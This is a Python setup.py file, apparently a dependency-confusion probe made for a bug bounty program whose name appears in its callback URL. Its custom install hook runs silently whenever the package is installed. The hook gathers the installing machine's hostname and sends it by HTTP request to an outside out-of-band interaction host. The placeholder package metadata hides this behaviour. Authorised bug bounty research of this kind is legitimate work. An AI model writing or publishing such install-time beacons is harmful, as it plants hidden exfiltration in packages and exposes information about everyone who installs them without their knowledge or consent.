from setuptools import setup
from setuptools.command.install import install
import requests
import socket

class CuDependency(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        pbodys = {'hostname':hostname, 'package':'vulnpac'}
        requests.get("https://d156mrq9s345llc6plj0i4wde8yknojwg.oast.live/root/public_targets/programs/bugcrowd/Afterpay-Bug-Bounty-Program/2025-05-28-09-31-02-890792/confusion",params = pbodys)


setup(name='your-module-name',
      version='1.0.0',
      description='example',
      author='testconfusion',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CuDependency})